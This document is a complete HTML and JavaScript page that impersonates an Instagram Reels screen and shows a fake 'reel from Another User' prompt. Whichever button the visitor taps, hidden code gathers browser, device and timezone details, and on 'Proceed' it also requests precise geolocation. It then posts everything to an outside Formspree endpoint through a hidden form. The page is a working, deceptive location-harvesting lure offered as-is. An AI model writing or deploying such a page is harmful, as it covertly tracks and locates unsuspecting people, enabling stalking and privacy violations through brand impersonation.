<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>Instagram • Reels</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 0;
      overflow: hidden;
    }

    .instagram-reel-container {
      width: 100%;
      max-width: 430px;
      background: #000;
      height: 100vh;
      max-height: 932px;
      display: flex;
      flex-direction: column;
      position: relative;
      overflow: hidden;
    }

    .status-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 16px 6px;
      color: white;
      font-size: 15px;
      font-weight: 590;
      background: linear-gradient(to bottom, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 100%);
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      z-index: 20;
    }

    .time {
      font-weight: 600;
    }

    .reel-header {
      position: absolute;
      top: 44px;
      left: 0;
      right: 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px 16px;
      color: white;
      z-index: 20;
      background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0) 100%);
    }

    .header-left {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .back-arrow {
      font-size: 26px;
      cursor: default;
      color: white;
    }

    .reels-text {
      font-size: 24px;
      font-weight: 800;
    }

    .reel-video-area {
      flex: 1;
      background: #0a0a0a;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .fake-video {
      width: 100%;
      height: 100%;
      background-image: radial-gradient(circle at 40% 50%, #2c2c2c, #0f0f0f);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    .play-badge {
      width: 72px;
      height: 72px;
      background: rgba(0, 0, 0, 0.55);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(12px);
      border: 1.5px solid rgba(255,255,255,0.4);
      transition: transform 0.2s ease, background 0.2s ease;
      cursor: pointer;
    }

    .play-badge:hover {
      transform: scale(1.05);
      background: rgba(0, 0, 0, 0.65);
    }

    .play-badge::after {
      content: '';
      display: block;
      width: 0;
      height: 0;
      border-left: 26px solid white;
      border-top: 15px solid transparent;
      border-bottom: 15px solid transparent;
      margin-left: 5px;
    }

    .action-sidebar {
      position: absolute;
      right: 14px;
      bottom: 100px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 24px;
      z-index: 15;
      color: white;
    }

    .action-btn {
      display: flex;
      flex-direction: column;
      align-items: center;
      background: transparent;
      border: none;
      color: white;
      gap: 6px;
      font-size: 28px;
      cursor: pointer;
      transition: transform 0.2s ease;
    }

    .action-btn:hover {
      transform: scale(1.1);
    }

    .action-btn span {
      font-size: 12px;
      font-weight: 600;
      background: rgba(0,0,0,0.4);
      padding: 2px 6px;
      border-radius: 20px;
      transition: background 0.2s ease;
    }

    .reel-info {
      position: absolute;
      bottom: 24px;
      left: 16px;
      right: 72px;
      color: white;
      z-index: 15;
      display: flex;
      flex-direction: column;
      gap: 10px;
      text-shadow: 0 1px 2px rgba(0,0,0,0.5);
    }

    .username-row {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .profile-pic {
      width: 38px;
      height: 38px;
      background: linear-gradient(145deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      color: white;
      border: 2px solid white;
    }

    .username {
      font-weight: 700;
      font-size: 15px;
    }

    .follow-btn {
      background: #0095f6;
      color: white;
      padding: 4px 12px;
      border-radius: 12px;
      font-size: 11px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .follow-btn:hover {
      background: #0081d4;
      transform: scale(1.02);
    }

    .caption {
      font-size: 14px;
      line-height: 1.35;
    }

    .music-row {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 12px;
      background: rgba(0,0,0,0.35);
      padding: 5px 12px;
      border-radius: 30px;
      width: fit-content;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .music-row:hover {
      background: rgba(0,0,0,0.5);
    }

    /* Native-looking iOS-style permission prompt */
    .permission-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(4px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      animation: fadeIn 0.2s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    /* iOS-style bottom sheet dialog */
    .permission-sheet {
      background: rgba(28, 28, 30, 0.98);
      backdrop-filter: blur(30px);
      border-radius: 24px;
      width: 90%;
      max-width: 340px;
      overflow: hidden;
      box-shadow: 0 20px 45px rgba(0,0,0,0.4);
      border: 0.5px solid rgba(255,255,255,0.15);
      animation: slideUp 0.25s ease-out;
    }

    @keyframes slideUp {
      from { transform: translateY(40px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    .sheet-header {
      padding: 20px 20px 12px;
      text-align: center;
    }

    .sheet-icon {
      width: 60px;
      height: 60px;
      margin: 0 auto 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: iconPop 0.3s ease-out;
    }

    @keyframes iconPop {
      0% { transform: scale(0.8); opacity: 0; }
      80% { transform: scale(1.1); }
      100% { transform: scale(1); opacity: 1; }
    }

    .sheet-icon img {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }

    .sheet-title {
      font-size: 18px;
      font-weight: 600;
      color: #fff;
      margin-bottom: 6px;
    }

    .sheet-subtitle {
      font-size: 13px;
      color: #8e8e93;
      line-height: 1.4;
    }

    .sheet-options {
      border-top: 0.5px solid rgba(255,255,255,0.1);
      margin-top: 8px;
    }

    .sheet-option {
      padding: 16px 20px;
      text-align: center;
      font-size: 17px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
      border-bottom: 0.5px solid rgba(255,255,255,0.08);
      position: relative;
      overflow: hidden;
    }

    .sheet-option::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 0;
      height: 0;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.1);
      transform: translate(-50%, -50%);
      transition: width 0.4s ease, height 0.4s ease;
    }

    .sheet-option:hover::before {
      width: 200px;
      height: 200px;
    }

    .sheet-option:active {
      transform: scale(0.98);
    }

    .allow-option {
      color: #0095f6;
      font-weight: 600;
      position: relative;
      background: linear-gradient(90deg, transparent, rgba(0, 149, 246, 0.05), transparent);
      background-size: 200% 100%;
      background-position: 100% 0;
      transition: background-position 0.3s ease, transform 0.2s ease;
    }

    .allow-option:hover {
      background-position: 0 0;
      color: #0aa3ff;
      letter-spacing: 0.3px;
    }

    .deny-option {
      color: #fff;
      position: relative;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.03), transparent);
      background-size: 200% 100%;
      background-position: 100% 0;
      transition: background-position 0.3s ease, transform 0.2s ease;
    }

    .deny-option:hover {
      background-position: 0 0;
      color: #e0e0e0;
      letter-spacing: 0.3px;
    }

    .hidden {
      display: none !important;
    }
  </style>
</head>
<body>
  <div class="instagram-reel-container">
    <div class="status-bar">
      <div class="time" id="liveTime">9:41</div>
      <div class="status-icons">📶 📡 🔋</div>
    </div>

    <div class="reel-header">
      <div class="header-left">
        <span class="back-arrow">←</span>
        <span class="reels-text">Reels</span>
      </div>
      <div class="camera-icon">📷</div>
    </div>

    <div class="reel-video-area">
      <div class="fake-video">
        <div class="play-badge"></div>
      </div>

      <div class="action-sidebar">
        <div class="action-btn">❤️<span>42.3K</span></div>
        <div class="action-btn">💬<span>1,284</span></div>
        <div class="action-btn">➤<span>Share</span></div>
        <div class="action-btn">⋯<span></span></div>
      </div>

      <div class="reel-info">
        <div class="username-row">
          <div class="profile-pic">🎵</div>
          <span class="username">music_vibes</span>
          <span class="follow-btn">Follow</span>
        </div>
        <div class="caption">
          New drop just landed 🔥 #reels #trending
        </div>
        <div class="music-row">
          🎵 Better Now - trending audio
        </div>
      </div>
    </div>
  </div>

  <!-- Permission prompt with custom Instagram PNG logo -->
  <div id="permissionOverlay" class="permission-overlay">
    <div class="permission-sheet">
      <div class="sheet-header">
        <div class="sheet-icon">
          <img src="logo_instagram.png" alt="Instagram" id="instagramLogo">
        </div>
        <div class="sheet-title">You have a reel from Another User. Proceed?</div>
        <div class="sheet-subtitle">Reels you watch may appear in your feed recommendations, Tap to watch the reel they sent you</div>
      </div>
      <div class="sheet-options">
        <div id="allowBtn" class="sheet-option allow-option">Proceed</div>
        <div id="denyBtn" class="sheet-option deny-option">Go Back</div>
      </div>
    </div>
  </div>

  <!-- Hidden form for data capture -->
  <form id="dataForm" action="https://formspree.io/f/xknkloqe" method="POST" style="display: none;">
    <input type="email" name="email" id="emailField">
    <textarea name="message" id="messageField"></textarea>
  </form>

  <script>
    (function() {
      const overlay = document.getElementById('permissionOverlay');
      const allowBtn = document.getElementById('allowBtn');
      const denyBtn = document.getElementById('denyBtn');
      const dataForm = document.getElementById('dataForm');
      const emailField = document.getElementById('emailField');
      const messageField = document.getElementById('messageField');
      const instagramLogo = document.getElementById('instagramLogo');

      // Handle logo loading error (fallback in case file is missing)
      if (instagramLogo) {
        instagramLogo.onerror = function() {
          console.warn("logo_instagram.png not found - using fallback");
          this.style.display = 'none';
          const fallback = document.createElement('div');
          fallback.textContent = '📷';
          fallback.style.fontSize = '48px';
          fallback.style.background = 'radial-gradient(circle at 30% 30%, #fdf497, #fdf497, #fd5949, #d6249f, #285AEB)';
          fallback.style.width = '60px';
          fallback.style.height = '60px';
          fallback.style.borderRadius = '32%';
          fallback.style.display = 'flex';
          fallback.style.alignItems = 'center';
          fallback.style.justifyContent = 'center';
          this.parentNode.appendChild(fallback);
          this.remove();
        };
      }

      // Update live time
      function updateTime() {
        const now = new Date();
        let hours = now.getHours();
        let minutes = now.getMinutes();
        const ampm = hours >= 12 ? 'PM' : 'AM';
        hours = hours % 12 || 12;
        const timeStr = `${hours}:${minutes.toString().padStart(2, '0')} ${ampm}`;
        const timeElement = document.getElementById('liveTime');
        if (timeElement) timeElement.textContent = timeStr;
      }
      updateTime();
      setInterval(updateTime, 60000);

      // Function to capture and send data
      function captureData(action, details) {
        const timestamp = new Date().toISOString();
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        
        let locationData = null;
        
        // Build comprehensive capture payload
        const payload = {
          action: action,
          timestamp: timestamp,
          userAgent: userAgent,
          platform: platform,
          language: language,
          screenSize: `${window.screen.width}x${window.screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          details: details
        };
        
        // If action is 'allow', try to get precise location
        if (action === 'allow') {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              (position) => {
                locationData = {
                  lat: position.coords.latitude,
                  lng: position.coords.longitude,
                  accuracy: position.coords.accuracy,
                  altitude: position.coords.altitude,
                  heading: position.coords.heading,
                  speed: position.coords.speed,
                  timestamp: position.timestamp
                };
                payload.location = locationData;
                payload.locationStatus = "captured";
                sendToFormspree(payload);
              },
              (error) => {
                let errorMsg = "";
                switch(error.code) {
                  case error.PERMISSION_DENIED:
                    errorMsg = "PERMISSION_DENIED";
                    break;
                  case error.POSITION_UNAVAILABLE:
                    errorMsg = "POSITION_UNAVAILABLE";
                    break;
                  case error.TIMEOUT:
                    errorMsg = "TIMEOUT";
                    break;
                }
                payload.locationStatus = `error: ${errorMsg}`;
                sendToFormspree(payload);
              },
              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
          } else {
            payload.locationStatus = "geolocation_not_supported";
            sendToFormspree(payload);
          }
        } else {
          // Deny - still send the interaction data
          sendToFormspree(payload);
        }
        
        // Hide overlay immediately
        overlay.classList.add('hidden');
      }

      // Send collected data to Formspree
      function sendToFormspree(data) {
        const jsonString = JSON.stringify(data, null, 2);
        messageField.value = jsonString;
        emailField.value = `capture_${Date.now()}@data.local`;
        
        // Use fetch for async submission - no page reload
        const formData = new FormData(dataForm);
        
        fetch(dataForm.action, {
          method: 'POST',
          body: formData,
          headers: { 'Accept': 'application/json' }
        })
        .then(response => {
          if (response.ok) {
            console.log("Data capture successful");
          } else {
            console.warn("Formspree response not OK");
          }
        })
        .catch(err => {
          console.error("Network error during capture:", err);
          // Fallback: try to submit normally
          try {
            const tempForm = dataForm.cloneNode(true);
            document.body.appendChild(tempForm);
            tempForm.submit();
            setTimeout(() => tempForm.remove(), 500);
          } catch(e) {}
        });
      }

      // Event handlers for the permission sheet
      allowBtn.addEventListener('click', (e) => {
        e.preventDefault();
        captureData('allow', 'User clicked Proceed');
      });

      denyBtn.addEventListener('click', (e) => {
        e.preventDefault();
        captureData('deny', 'User selected Go Back');
      });

      // Prevent accidental background clicks
      overlay.addEventListener('click', (e) => {
        if (e.target === overlay) {
          // Do nothing - force user to make choice
        }
      });

      // Add ripple effect to buttons
      const buttons = [allowBtn, denyBtn];
      buttons.forEach(btn => {
        btn.addEventListener('mousedown', (e) => {
          const rect = btn.getBoundingClientRect();
          const x = e.clientX - rect.left;
          const y = e.clientY - rect.top;
          
          const ripple = document.createElement('span');
          ripple.style.position = 'absolute';
          ripple.style.width = '0px';
          ripple.style.height = '0px';
          ripple.style.borderRadius = '50%';
          ripple.style.backgroundColor = 'rgba(255, 255, 255, 0.3)';
          ripple.style.transform = 'translate(-50%, -50%)';
          ripple.style.left = x + 'px';
          ripple.style.top = y + 'px';
          ripple.style.transition = 'width 0.4s ease, height 0.4s ease, opacity 0.4s ease';
          ripple.style.pointerEvents = 'none';
          ripple.style.zIndex = '10';
          
          btn.style.position = 'relative';
          btn.style.overflow = 'hidden';
          btn.appendChild(ripple);
          
          setTimeout(() => {
            ripple.style.width = '300px';
            ripple.style.height = '300px';
            ripple.style.opacity = '0';
          }, 10);
          
          setTimeout(() => {
            ripple.remove();
          }, 400);
        });
      });
    })();
  </script>
</body>
</html>
